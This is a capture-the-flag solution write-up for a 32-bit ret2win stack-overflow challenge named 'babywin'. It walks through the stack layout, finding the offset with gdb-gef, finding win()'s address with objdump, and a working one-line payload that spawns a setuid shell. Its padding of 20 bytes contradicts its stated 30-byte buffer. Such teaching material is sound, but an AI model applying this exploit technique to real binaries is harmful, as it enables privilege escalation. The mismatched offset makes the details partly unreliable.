## Solution

It is a ret2win stack overflow. The program is compiled without any protection in 32 bits.
In order to gain access to the flag owned by pwn3r-cracked, the player has to call win() in order to spawn a setuid shell.
The player may use python3, gdb, build-essentials tools on the container to achieve this and work in /tmp to avoid spoilers:

```bash
cd $(mktemp -d)
```
The stack is as follows (grows to lower addresses):

------------- 0xbf???f
| EBP (top) |
|-----------|           
| EIP (ret) |  <- win
|           |             +
|-----------|             |
| saved EBP |             |
|-----------|             |
| EIP (ret) |  <- main    -
|           |            
| addr win  |  overflow main's ret to call win() here        
|-----------|            
| saved EBP |            
|-----------|
|name(30 b.)|
|-----------| 0xbf???0
  ESP (bottom)


That means that we have to overflow at least 30 bytes (name) + EBP to overwrite EIP=return address of main, then place the address of win.
To achieve this, you can send N bytes with a trial-an-error approach or find the EIP/name-offset to fill using gdb-gef `pattern create 100`, run with a breakpoint, then `pattern search <part of the pattern you will see in ebp>`.

Then find `win` address (static, no protections), using `objdump -d babywin | grep win`
Dont forget to put it in little-endian (most of processors way of reading data).

The processor will deal with win address as a flow of bytes when its value will pop.
Last but not least, we have to block stdin with cat (for instance) to get our shell.

Warning, the offset (30) may be wrong -> CHECK!

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\xa6\x91\x04\x08')"; cat) | ./babywin
```
